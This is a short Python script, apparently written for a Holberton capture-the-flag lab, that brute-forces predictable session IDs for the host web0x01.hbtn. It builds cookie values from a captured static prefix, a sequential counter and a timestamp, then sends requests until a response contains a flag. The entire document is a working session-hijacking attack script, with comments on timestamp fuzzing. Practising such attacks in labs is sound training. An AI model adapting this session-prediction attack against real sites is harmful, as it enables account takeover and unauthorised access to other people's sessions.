import requests
import sys

# Target URL
url = "http://web0x01.hbtn/a1/hijack_session"

# Base parts derived from your analysis
static_prefix = "8842f431-54f2-4416-829"

# We need a reference point. Use the latest session ID you captured:
# Example: 8842f431-54f2-4416-829-3556315-17701421664
ref_counter = 3556315
ref_timestamp = 17701421664

# How many previous sessions to check?
# In CTFs, the flag is usually in the very first few sessions or a specific recent one.
# Let's verify sessions 0 to 100 first, or work backwards.
start_counter = 0 
end_counter = 100

print(f"[*] Starting brute-force attack on {url}...")

for i in range(start_counter, end_counter):
    # Construct the sequential part
    target_counter = i
    
    # Heuristic: Estimate timestamp based on the counter difference.
    # The timestamps in your logs grew by ~200 units per counter increment.
    # However, for a brute force, we might just iterate a range around a guess.
    
    # Note: If the server validates ONLY the counter (common in basic labs),
    # we might not even need the exact timestamp. Let's try to preserve the 
    # format but hold the timestamp constant or derived.
    
    # If the checker requires a valid timestamp, we must brute force the time range.
    # Let's assume the very first session (Counter 0) happened sometime before your capture.
    
    # For this specific Holberton lab, often the exact timestamp isn't strictly checked 
    # OR it's a very simple decrement. Let's try iterating counters with the *current* timestamp first.
    # If that fails, we implement the timestamp fuzzing.
    
    # Constructing the cookie value
    # Try using the reference timestamp first (loose validation check)
    session_id = f"{static_prefix}-{target_counter}-{ref_timestamp}"
    
    cookies = {'hijack_session': session_id}
    
    try:
        r = requests.get(url, cookies=cookies)
        
        # Check for success indicators
        # Success usually looks like "Flag: ..." or a different page title
        if "Flag" in r.text or "HBTN" in r.text:
            print(f"[+] Success! Cookie found: {session_id}")
            print(f"[+] Response Content:\n{r.text}")
            break
        elif r.status_code != 200:
            print(f"[-] Error {r.status_code} for {session_id}")
            
    except Exception as e:
        print(f"[!] Connection error: {e}")
